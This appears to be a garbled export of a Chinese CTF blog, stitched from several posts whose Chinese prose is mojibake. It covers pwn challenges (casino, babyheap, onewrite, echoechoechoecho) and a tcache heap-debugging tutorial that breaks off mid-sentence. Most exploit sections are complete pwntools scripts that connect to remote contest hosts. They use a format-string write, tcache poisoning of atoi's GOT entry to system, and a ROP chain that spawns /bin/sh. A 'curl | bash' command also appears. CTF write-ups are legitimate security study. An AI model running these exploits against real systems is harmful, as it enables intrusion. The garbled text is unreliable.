ä¸º8byteè¡¥é½å’Œ\\x00æˆªæ–­çš„é—®é¢˜å‘äº†å¥½ä¹…ï¼Œä½†æœ€åè¿˜æ˜¯æ“å‡ºæ¥ä¸€ä¸ªè¿˜è¡Œçš„payload EXP#! /usr/bin/env python # -*- coding: utf-8 -*- # Distributed under terms of the MIT license. # Author = nepire from pwn import* from ctypes import * context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) # n = process(&#39;./casino&#39;) n = remote(&#39;35.243.188.20&#39;,2001) elf = ELF(&#39;./casino&#39;) libc = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) bet = 0x03 fmt_offset = 10 seed = libc.time(0)/0xa print &quot;seed:&quot;,hex(seed) seed += bet libc.srand(seed) idx = 1 n.recvuntil(&#39;?&#39;) payload = &#39;aaa%11$n&#39;+p32(0x602020).ljust(8,&#39;\\x00&#39;) n.sendline(payload) for i in range(0,99): # n.recvuntil(&#39;number: &#39;) num = libc.rand() sleep(0.08) n.sendline(str(num)) s = &quot;&lt;%03d/100&gt;&quot;%idx log.success(s) idx += 1 n.interactive() FLAGF#{buggy_c4s1n0_1s_n0t_f41r!} babyheapâœ babyheap checksec babyheap [*] &#39;/home/Ep3ius/CTF/pwn/process/2019-FireShellCTF/babyheap/babyheap&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) æœ¬æ¥æƒ³è¯´å‘ï¼Œå¯æƒ³æƒ³æ˜¯è‡ªå·±æ²¡æœ‰å…ˆcheckä¸€ä¸‹libcç‰ˆæœ¬çš„é”…ï¼Œåªèƒ½è¯´è‡ªå·±è¿˜ä¸å¤Ÿæˆç†Ÿäº†ï¼ˆæ— å¥ˆï¼‰ âœ babyheap strings libc.so.6 | grep GNU GNU C Library (Ubuntu GLIBC 2.26-0ubuntu2.1) stable release version 2.26, by Roland McGrath et al. Compiled by GNU CC version 6.4.0 20171010. GNU Libidn by Simon Josefsson libcç‰ˆæœ¬æ˜¯2.26ï¼Œç¯å¢ƒåˆ‡åˆ°2.26ä¸‹å¼€å§‹åˆ†æï¼Œå¾ˆå¿«å°±èƒ½å°±å‘ç°å¯èƒ½å­˜åœ¨UAF&amp;double freeï¼Œè¿˜æœ‰ä¸€ä¸ªchoiceä¸º1337åŠŸèƒ½å¤§è‡´æ˜¯malloc(0x60)ç„¶åå†™0x40byteçš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°ç”¨UAFåŠ«æŒç¨‹åºåœ¨ä¸€ä¸ªå¯å†™çš„åœ°æ–¹(!! bssæ®µå¼€å§‹çš„åœ°æ–¹æœ‰stdinå’Œstdoutä¸èƒ½è¦†ç›–ï¼Œè¦åŠ ä¸ªåç§»)mallocä¸€ä¸ªå—ç„¶åé€šè¿‡1337å‡½æ•°æ¥ä¼ªé€ bkæŒ‡é’ˆä¸ºatoi_gotæ¥æ³„æ¼å‡ºlibcï¼Œå†é€šè¿‡tcache_poisoningæŠŠatoi_gotæ”¹æˆsystem_addråå›åˆ°æœ‰ç”¨atoiçš„åœ°æ–¹è¾“å…¥/bin/shå°±èƒ½å¾—åˆ°shelläº†ã€‚ EXP#! /usr/bin/env python # -*- coding: utf-8 -*- # Distributed under terms of the MIT license. # Author = nepire from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) # n = process(&#39;./babyheap&#39;) n = remote(&quot;51.68.189.144&quot;, 31005) elf = ELF(&#39;./babyheap&#39;) libc = ELF(&#39;./libc.so.6&#39;) #2.26 def choice(idx): n.recvuntil(&#39;&gt; &#39;) n.sendline(str(idx)) def new(): choice(1) def edit(content): choice(2) n.recvuntil(&#39;Content? &#39;) n.sendline(content) def show(): choice(3) def free(): choice(4) def readn(content): choice(1337) n.recvuntil(&#39;Fill &#39;) n.send(content) bss = elf.bss()+0x20 log.success(hex(bss)) atoi_got = elf.got[&#39;atoi&#39;] log.success(hex(atoi_got)) new() free() edit(p64(bss)) new() # gdb.attach(n) payload = p64(0)*5 + p64(atoi_got) readn(payload) show() n.recvuntil(&#39;Content: &#39;) libc_base = u64(n.recv(6)+&#39;\\x00\\x00&#39;)-libc.sym[&#39;atoi&#39;] print &quot;libc_base:&quot;,hex(libc_base) system_addr = libc_base + libc.sym[&#39;system&#39;] edit(p64(system_addr)) #atoi_got -&gt; system_addr choice(&#39;/bin/sh\\x00&#39;) n.interactive() FLAGF#{W3lc0m3_t0_h34p_Expl01t4t10n!}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"INSCTF2019ç¬”è®°","slug":"INSCTF2019ç¬”è®°","date":"2019-11-05T04:08:27.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/INSCTF2019ç¬”è®°/","link":"","permalink":"/2019/11/05/INSCTF2019ç¬”è®°/","excerpt":"","text":"æ€»ä¹‹é¿å…äº†æ–°å¹´çš„ç¬¬ä¸€åœºCTFå°±çˆ†0çš„å°´å°¬ï¼Œä½†ç­¾åˆ°çƒ­èº«é¢˜æ²¡åšå‡ºæ¥å°±å¾ˆéš¾å—ï¼Œè¿™æ¬¡çœ‹äº†curlpipebash/echoechoechoecho/nyanc/onewriteå››é¢˜ï¼Œç»“æœåªåœ¨gdbè°ƒè¯•ä¸åŠ¨çš„æƒ…å†µç¡¬åˆšå‡ºæ¥äº†ä¸€é¢˜onewrite(nä¸äº†ï¼Œè¦æ‰¾ä¸€ä¸‹ç›¸å…³çš„èµ„æ–™) curlpipebashcurl -Ns https://curlpipebash.teaser.insomnihack.ch/print-flag.sh | bash è®¿é—®https://curlpipebash.teaser.insomnihack.ch/print-flag.shåä¼šè·³è½¬åˆ°https://curlpipebash.teaser.insomnihack.ch/xxxxx-xxxxxx-xxxx-xxxxç±»ä¼¼è¿™æ ·çš„åŸŸåï¼Œä½†è®¿é—®è¿™ä¸ªè·¯å¾„ä¸‹çš„æ‰€æœ‰ä¸œè¥¿éƒ½ä¼šé‡å®šå‘åˆ°print-flag.shï¼Œç„¶åå°±æ²¡æ€è·¯äº† echoechoechoechoç»™äº†python3çš„shellæºç  #!/usr/bin/env python3 from os import close from random import choice import re from signal import alarm from subprocess import check_output from termcolor import colored alarm(10) colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;,&quot;yellow&quot;,&quot;magenta&quot;,&quot;cyan&quot;,&quot;white&quot;] # thanks http://patorjk.com/software/taag/#p=display&amp;h=0&amp;f=Crazy&amp;t=echo banner = &quot;&quot;&quot; echoechoechoecho &quot;&quot;&quot; def bye(s=&quot;&quot;): print(s) print(&quot;bye&quot;) exit() def check_input(payload): if payload == &#39;thisfile&#39;: bye(open(&quot;/bin/shell&quot;).read()) if not all(ord(c) &lt; 128 for c in payload):#Only Ascii bye(&quot;ERROR ascii only pls&quot;) #åŒ¹é…é™¤();+$\\&#39;ä¹‹å¤–çš„å­—ç¬¦ if re.search(r&#39;[^();+$\\\\= \\&#39;]&#39;, payload.replace(&quot;echo&quot;, &quot;&quot;)): bye(&quot;ERROR invalid characters&quot;) # real echolords probably wont need more special characters than this if payload.count(&quot;+&quot;) &gt; 1 or \\ payload.count(&quot;&#39;&quot;) &gt; 1 or \\ payload.count(&quot;)&quot;) &gt; 1 or \\ payload.count(&quot;(&quot;) &gt; 1 or \\ payload.count(&quot;=&quot;) &gt; 2 or \\ payload.count(&quot;;&quot;) &gt; 3 or \\ payload.count(&quot; &quot;) &gt; 30:#æœªé™åˆ¶echoå’Œ\\çš„ä½¿ç”¨æ¬¡æ•° bye(&quot;ERROR Too many special chars.&quot;) return payload print(colored(banner, choice(colors))) print(&quot;Hi, what would you like to echo today? (make sure to try &#39;thisfile&#39;)&quot;) payload = check_input(input()) print(&quot;And how often would you like me to echo that?&quot;) count = max(min(int(input()), 10), 0) #è¾“å…¥çš„è½¬intå°äº10å¤§äº0 == count&lt;=10 &amp;&amp; count &gt;= 0 payload += &quot;|bash&quot;*count close(0) result = check_output(payload, shell=True, executable=&quot;/bin/bash&quot;) bye(result.decode()) bye æ¯«æ— æ€è·¯ï¼Œå¯¹bashçš„é€šé…ç¬¦æ“ä½œè¿˜æ˜¯éœ€è¦ç¨å¾®çœ‹ä¸€ä¸‹ nyancç”¨chrootèµ·çš„arm64ç¨‹åºï¼Œæ“äº†ä¸€ä¸ªæ–¹ä¾¿debugçš„è„šæœ¬ #!/bin/bash gnome-terminal -x gdb-multiarch nyanc -q -x remote qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu nyanc onewriteâœ onewrite checksec onewrite [!] Did not find any GOT entries [*] &#39;/home/nepire/CTF/pwn/process/2018INSctf/onewrite/onewrite&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ç¨‹åºé€»è¾‘ä¹Ÿå¾ˆç®€å•ï¼Œå…ˆé€‰æ‹©æ³„æ¼stackæˆ–codebaseï¼Œç„¶åæ ¹æ®å¾—åˆ°çš„åœ°å€å»ä»»æ„åœ°å€å†™ä¸€æ¬¡é€€å‡ºï¼Œæ­£å¸¸ä¸€å¼€å§‹éƒ½ä¼šå»æƒ³æ€ä¹ˆå»æŠŠä¸€æ¬¡ä»»æ„å†™å˜æˆæ— é™ä»»æ„å†™æ¥æ‰©å¤§æ§åˆ¶åŠ›ï¼Œè€Œæˆ‘ä¸çŸ¥é“æ˜¯è„‘æŠ½äº†è¿˜æ˜¯æ€ä¹ˆçš„ä¸€å¼€å§‹å°±å»çœ‹exité‡Œé¢æœ‰ä»€ä¹ˆå¯ä»¥ç”¨çš„gagdetä¸€æ¬¡è·³è½¬å°±èƒ½å¾—åˆ°ï¼Œæœ€åè¿˜æ˜¯åœ¨åˆ«äººæé†’åæ‰å»æ”¹çš„retï¼Œç¨ç¨æœ‰ç‚¹è¢«è‡ªå·±æ°”åˆ°äº†ï¼Œæœ‰äº†æ— é™å†™ä¹‹åå°±å¥½è¯´äº†ï¼Œå› ä¸ºæ˜¯é™æ€ç¼–è¯‘çš„gadgetè¶³å¤Ÿæ¥æ„é€ execve(â€˜/bin/shâ€™),æ‰€ä»¥å¾€bssæ®µå†™ropchainï¼Œç„¶åå†é€šè¿‡pop_rsp_retæ¥è·³åˆ°bssæ®µä¸Šæ‰§è¡Œï¼Œä¸è¿‡æ¯”èµ›æœåŠ¡å™¨çš„åŒºåŸŸwafæœ‰ç‚¹å¼ºï¼Œå¾—è·‘ä¸ªåŠå¤©ï¼Œå…ˆå†™å¥½cat flagç„¶åå¾ªç¯è·‘å°±å¯¹äº† #! /usr/bin/env python # -*- coding: utf-8 -*- # Author = nepire # flag:INS{one leak, one write, many possibilities...} from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./onewrite&#39;) #n = remote(&#39;onewrite.teaser.insomnihack.ch&#39;,1337) elf = ELF(&#39;./onewrite&#39;) def leak_stack(): n.recvuntil(&#39;&gt;&#39;) n.sendline(&quot;1&quot;) return int(n.recvuntil(&#39;\\n&#39;),16) def leak_pie(): n.recvuntil(&#39;&gt;&#39;) n.sendline(&#39;2&#39;) return int(n.recvuntil(&#39;\\n&#39;),16) def write(addr,data): n.recvuntil(&#39;address :&#39;) n.send(str(int(addr))) n.recvuntil(&#39;data : &#39;) n.send(data) def write_bss(idx): i = 8*idx stack = leak_stack() write(bss_addr+i,rop[i:i+8]) for i in range(2): stack = leak_stack() log.success(hex(stack)) ret = stack - 8 write(ret,p64(main_addr)) stack = leak_stack() log.success(hex(stack)) ret = stack - 8 write(ret,&#39;\\x15&#39;) # 0x7ffff7d52ab2 (do_leak+157) -&gt; 0x7ffff7d52a15 (do_leak) pie = leak_pie() codebase = pie - 0x8a15 log.success(hex(codebase)) ##### leak stack codebase &amp;&amp; edit ret #### bss_addr = codebase + elf.bss() main_addr = codebase + 0x8ab8 pb = lambda x : p64(x + codebase) rop = pb(0x000000000000d9f2) # pop rsi ; ret rop += pb(0x00000000002b1120) # @ .data rop += pb(0x00000000000460ac) # pop rax ; ret rop += &#39;/bin//sh&#39; rop += pb(0x0000000000077901) # mov qword ptr [rsi], rax ; ret rop += pb(0x000000000000d9f2) # pop rsi ; ret rop += pb(0x00000000002b1128) # @ .data + 8 rop += pb(0x0000000000041360) # xor rax, rax ; ret rop += pb(0x0000000000077901) # mov qword ptr [rsi], rax ; ret rop += pb(0x00000000000084fa) # pop rdi ; ret rop += pb(0x00000000002b1120) # @ .data rop += pb(0x000000000000d9f2) # pop rsi ; ret rop += pb(0x00000000002b1128) # @ .data + 8 rop += pb(0x00000000000484c5) # pop rdx ; ret rop += pb(0x00000000002b1128) # @ .data + 8 rop += pb(0x0000000000041360) # xor rax, rax ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006e605) # syscall ; ret gadgetlen = len(rop)/8 ############ loading gadget ############## #idx0 write(bss_addr,rop[0:8]) for i in range(2): stack = leak_stack() log.success(hex(stack)) ret = stack - 8 write(ret,p64(main_addr)) #idx 1-last for i in range(1,gadgetlen): write_bss(i) ########### write gadget in bss ############ pop_rsp_ret = codebase + 0x946a stack = leak_stack() log.success(hex(stack)) write(stack+0x38,p64(pop_rsp_ret)) stack = leak_stack() log.success(hex(stack)) write(stack+0x20,p64(bss_addr)) ########### jmp bss getshell ############# n.interactive()","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"åœ¨debugä¸­å­¦tcache","slug":"åœ¨debugä¸­å­¦tcache","date":"2019-11-05T04:03:57.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/åœ¨debugä¸­å­¦tcache/","link":"","permalink":"/2019/11/05/åœ¨debugä¸­å­¦tcache/","excerpt":"","text":"æœ€è¿‘æ¯”èµ›Pwnçš„libcç‰ˆæœ¬è¶Šæ¥è¶Šå¤š2.26ä»¥ä¸Šçš„äº†ï¼Œä¹Ÿå°±ç›¸å½“äºå¤šäº†ä¸å°‘tcacheç›¸å…³çš„é¢˜ç›®ï¼Œäºæ˜¯æœ€è¿‘æ¶è¡¥äº†ä¸€æ³¢tcacheæœºåˆ¶ç›¸å…³çš„ä¸œè¥¿ï¼Œå¹¶è®°å½•ä¸‹tcacheç›¸å…³é¢˜ç›®çš„è°ƒè¯• æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºåœ¨Debugä¸­å­¦Tcache tcacheç®€ä»‹tcacheï¼ˆthread local cachingï¼‰æ˜¯glibcåœ¨2.26ç‰ˆæœ¬æ–°å‡ºç°çš„ä¸€ç§å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œå®ƒä¼˜åŒ–äº†åˆ†é…æ•ˆç‡å´ä¹Ÿé™ä½äº†å®‰å…¨æ€§ï¼Œä¸€äº›æ¼æ´çš„åˆ©ç”¨æ¡ä»¶å˜å¾—å®¹æ˜“äº†è®¸å¤š é¦–å…ˆæˆ‘ä»¬å…ˆçœ‹ä¸‹tcacheæ–°å¼•å…¥çš„ä¸¤ä¸ªæ•°æ®ç»“æ„tcache_entry å’Œtcache_perthread_struct /* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */ typedef struct tcache_entry { struct tcache_entry *next; } tcache_entry; /* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */ typedef struct tcache_perthread_struct { char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct; static __thread tcache_perthread_struct *tcache = NULL; è¿™é‡Œç®€å•çš„è¯´æ˜ä¸€ä¸‹tcacheå’Œfastbinçš„ç»“æ„éƒ½å¾ˆç›¸åƒä¹Ÿéƒ½æ˜¯å•é“¾è¡¨ç»“æ„ï¼Œæ˜æ˜¾çš„ä¸åŒæ˜¯fastbinæ¯ä¸ªbinsæœ‰10ä¸ªå—è€Œtcacheæ˜¯7ä¸ªå¹¶ä¸”tcacheçš„ä¼˜å…ˆçº§è¦é«˜äºfastbinï¼Œç›¸å½“äºåªæœ‰tcacheæ”¾ä¸ä¸‹äº†æ‰ä¼šæ”¾å…¥fastbin (0x20) tcache_entry[0]: 0x55ea7bc0d320 --&gt; 0x55ea7bc0d300 --&gt; 0x55ea7bc0d2e0 --&gt; 0x55ea7bc0d2c0 --&gt; 0x55ea7bc0d2a0 --&gt; 0x55ea7bc0d280 --&gt; 0x55ea7bc0d260 æˆ‘ä»¬å…ˆçœ‹ä¸‹é¢˜ç›®çš„åŸºæœ¬ä¿¡æ¯ï¼Œè¿™é‡Œæˆ‘æ˜¯ç”¨äº†è‡ªå·±å†™çš„ä¸€ä¸ªpwnç¯å¢ƒæ¥å®ç°tcacheçš„è°ƒè¯•å…·ä½“é“¾æ¥ä¼šåœ¨æœ«å°¾æ”¾å‡º âœ tcache file children_tcache children_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ebf73572ad77a035a366578bf87c6aabc6a235a1, stripped âœ tcache checksec children_tcache [*] &#39;/home/ctf/process/tcache/children_tcache&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 64ä½é˜²æŠ¤å…¨å¼€çš„ç¨‹åºï¼ŒçœŸçš„åˆºæ¿€ï¼Œæˆ‘ä»¬çœ‹ä¸‹ç¨‹åºå¹²äº†äº›ä»€ä¹ˆ âœ tcache ./children_tcache $$$$$$$$$$$$$$$$$$$$$$$$$$$ ğŸŠ Children Tcache ğŸŠ $$$$$$$$$$$$$$$$$$$$$$$$$$$ $ 1. New heap $ $ 2. Show heap $ $ 3. Delete heap $ $ 4. Exit $ $$$$$$$$$$$$$$$$$$$$$$$$$$$ Your choice: 1 Size:12 Data:aaaa ä¸€ä¸ªåŸºæœ¬çš„èœå•ç±»å‹çš„pwné¢˜ï¼Œåœ¨ç®€å•çš„å®¡è®¡è¿‡åå°±èƒ½å‘ç°æ¼æ´ï¼Œé¦–å…ˆæˆ‘ä»¬çœ‹ä¸‹ç¨‹åºæœ¬èº«äº§ç”Ÿçš„é—®é¢˜ void new() { signed int i; // [rsp+Ch] [rbp-2034h] char *note_chunk; // [rsp+10h] [rbp-2030h] unsigned __int64 size; // [rsp+18h] [rbp-2028h] char buf; // [rsp+20h] [rbp-2020h] unsigned __int64 v4; // [rsp+2038h] [rbp-8h] v4 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x2010uLL); for ( i = 0; ; ++i ) { if ( i &gt; 9 ) { puts(&quot;:(&quot;); return; } if ( !note[i] ) break; } printf(&quot;Size:&quot;); size = input(); if ( size &gt; 0x2000 ) exit(-2); note_chunk = malloc(size); if ( !note_chunk ) exit(-1); printf(&quot;Data:&quot;); read_chk_input(&amp;buf, size); strcpy(note_chunk, &amp;buf); note[i] = note_chunk; note_size[i] = size; } æˆ‘ä»¬çŸ¥é“strcpyåœ¨æ‹·è´å­—ç¬¦ä¸²æ—¶è¿æœ«å°¾çš„â€™\\0â€™ä¹Ÿä¼šä¸€èµ·æ‹·è´ï¼Œå‡è®¾æˆ‘ä»¬çš„å­—ç¬¦ä¸²é•¿åº¦åˆšå¥½å’Œæ‰€åˆ†é…ç»™å®ƒçš„é•¿åº¦ç›¸ç­‰ï¼Œé‚£ä¹ˆå°±å¯èƒ½ä¼šé€ æˆnull-byte-off-by-oneæ¼æ´ï¼Œæˆ‘ä»¬ç®€å•çš„éªŒè¯ä¸€ä¸‹ #poc new(0x10,&#39;a&#39;*8) new(0x110,&#39;aaaa&#39;) raw_input() free(0) new(0x18,&#39;a&#39;*0x18) raw_input() pwndbg&gt; parseheap addr prev size status fd bk 0x565258e29000 0x0 0x250 Used None None 0x565258e29250 0x0 0x20 Used None None 0x565258e29270 0x0 0x110 Used None None pwndbg&gt; parseheap addr prev size status fd bk 0x565258e29000 0x0 0x250 Used None None 0x565258e29250 0x0 0x20 Freed 0x61616161616161610x6161616161616161 0x565258e29270 0x6161616161616161 0x100 Freed 0x62626262 0x0 Corrupt ?! (size == 0) (0x565258e29370) pwndbg&gt; x/8x 0x565258e29250 0x565258e29250: 0x0000000000000000 0x0000000000000021 0x565258e29260: 0x6161616161616161 0x0000000000000000 0x565258e29270: 0x0000000000000000 0x0000000000000111 0x565258e29280: 0x0000000062626262 0x0000000000000000 pwndbg&gt; x/8x 0x565258e29250 0x565258e29250: 0x0000000000000000 0x0000000000000021 0x565258e29260: 0x6161616161616161 0x6161616161616161 0x565258e29270: 0x6161616161616161 0x0000000000000100 ==&gt;è¿™é‡ŒåŸæœ¬åº”è¯¥ä¸º0x111ä½†æœ€æœ«å°¾çš„0x11è¢«0x00è¦†ç›–äº† 0x565258e29280: 0x0000000062626262 0x0000000000000000 ç”±äºè¿™é¢˜çš„å‡ºé¢˜äººç”¨0xdaå¡«å……æ•´ä¸ªchunkï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¼ªé€ pre_sizeæ¥overlapping void delete() { unsigned __int64 idx; // [rsp+8h] [rbp-8h] printf(&quot;Index:&quot;); idx = input(); if ( idx &gt; 9 ) exit(-3); if ( note[idx] ) { memset(note[idx], 0xDA, note_size[idx]); free(note[idx]); note[idx] = 0LL; note_size[idx] = 0LL; } puts(&quot;:)&quot;); } ä½†æˆ‘ä»¬åˆšåˆšæ‰éªŒè¯çš„null byte off-by-oneæº¢å‡ºçš„å­—èŠ‚ä¸º\\x00ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡åå¤çš„åˆ©ç”¨è¿™ä¸ªæŠŠpre_sizeä½æ¸…0æ¥æ„é€ overlapping #poc new(0x10,&#39;aaaa&#39;) new(0x110,&#39;aaaa&#39;) free(0) for i in range(8): new(0x10-i,&#39;a&#39;*(0x10-i)) free(0) raw_input() pwndbg&gt; parseheap addr prev size status fd bk 0x560894f1f000 0x0 0x20 Freed 0x61616161616161610x6161616161616161 0x560894f1f020 0x130 0x100 Freed 0x61616161 0x0 Corrupt ?! (size == 0) (0x560894f1f120) pwndbg&gt; x/8x 0x560894f1f000 0x560894f1f000: 0x0000000000000000 0x0000000000000021 0x560894f1f010: 0x6161616161616161 0x6161616161616161 0x560894f1f020: 0x0000000000000130 0x0000000000000100 0x560894f1f030: 0x0000000061616161 0x0000000000000000 æ¥ç€æˆ‘ä»¬éœ€è¦libc_baseæ¥æ–¹ä¾¿åé¢çš„æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨newä¸­å¯¹sizeçš„æ£€éªŒèŒƒå›´ååˆ†å¤§ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡unsort_bin_attackæ¥æ³„éœ²ä¸€ä¸ªç´§è´´libcçš„åœ°å€ ï¼Œä¹‹åæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒè¯•å¾—åˆ°è¿™ä¸ªåœ°å€ä¸libc_baseçš„åç§»ï¼Œå°±ç›¸å½“ä¸æ³„éœ²å‡ºäº†libc_base printf(&quot;Size:&quot;); size = input(); if ( size &gt; 0x2000 ) exit(-2); note_chunk = malloc(size); æˆ‘ä»¬ç®€å•çš„åšä¸ªunsort_bin_attackå°è¯•æŠŠè¿™ä¸ªåœ°å€å†™å…¥åˆ°chunkä¸Š #poc new(0x500,&#39;aaaaa&#39;) new(0x10,&#39;bbbb&#39;) free(1) free(0) pwndbg&gt; parseheap addr prev size status fd bk 0x55763fe59000 0x0 0x250 Used None None 0x55763fe59250 0x0 0x510 Freed 0x7f74dac85c78 0x7f74dac85c78 0x55763fe59760 0x510 0x20 Used None None pwndbg&gt; x/8x 0x55763fe59250 0x55763fe59250: 0x0000000000000000 0x0000000000000511 0x55763fe59260: 0x00007f74dac85c78 0x00007f74dac85c78 &lt;== 0x55763fe59270: 0x0000000000000000 0x0000000000000000 0x55763fe59280: 0xdadadadadadadada 0xdadadadadadadada æœ‰äº†è¿™äº›æ¡ä»¶åæˆ‘ä»¬ä¾¿å¯ä»¥å»æ³„éœ²libcäº†ï¼Œæˆ‘ä»¬ç”¨å›¾æ¼”ç¤ºä¸‹æµç¨‹ #free before pwndbg&gt; parseheap addr prev size status fd bk 0x55a2d6e3a000 0x0 0x250 Used None None 0x55a2d6e3a250 0x0 0x510 Freed 0x7fba63b37c78 0x7fba63b37c78 0x55a2d6e3a760 0x510 0x30 Freed 0x61616161616161610x6161616161616161 0x55a2d6e3a790 0x540 0x500 Used None None 0x55a2d6e3ac90 0x0 0x20 Used None None pwndbg&gt; x/8x 0x55a2d6e3a760 0x55a2d6e3a760: 0x0000000000000510 0x0000000000000030 0x55a2d6e3a770: 0x6161616161616161 0x6161616161616161 0x55a2d6e3a780: 0x6161616161616161 0x6161616161616161 0x55a2d6e3a790: 0x0000000000000540 0x0000000000000500 pwndbg&gt; x/8x 0x55a2d6e3a790 0x55a2d6e3a790: 0x0000000000000540 0x0000000000000500 0x55a2d6e3a7a0: 0x0000000063636363 0x0000000000000000 0x55a2d6e3a7b0: 0x0000000000000000 0x0000000000000000 0x55a2d6e3a7c0: 0x0000000000000000 0x0000000000000000 #free after pwndbg&gt; parseheap addr prev size status fd bk 0x563204289000 0x0 0x250 Used None None 0x563204289250 0x0 0xa40 Freed 0x7f01905acc78 0x7f01905acc78 0x563204289c90 0xa40 0x20 Used None None pwndbg&gt; x/8x 0x563204289250 0x563204289250: 0x0000000000000000 0x0000000000000a41 0x563204289260: 0x00007f01905acc78 0x00007f01905acc78 0x563204289270: 0x0000000000000000 0x0000000000000000 0x563204289280: 0xdadadadadadadada 0xdadadadadadadada pwndbg&gt; è¿™æ—¶æˆ‘ä»¬å†æ–°å»ºä¸€ä¸ªchunkåˆ†é…å¤§å°å’Œchunk0ä¸€æ ·æ—¶ï¼Œchunkå°±ä¼šåˆ†é…åˆ°chunk0æ‰€åœ¨çš„ä½ç½®ï¼Œè¿™æ—¶æˆ‘ä»¬show(0)å³å¯leak_libc è¿™æ 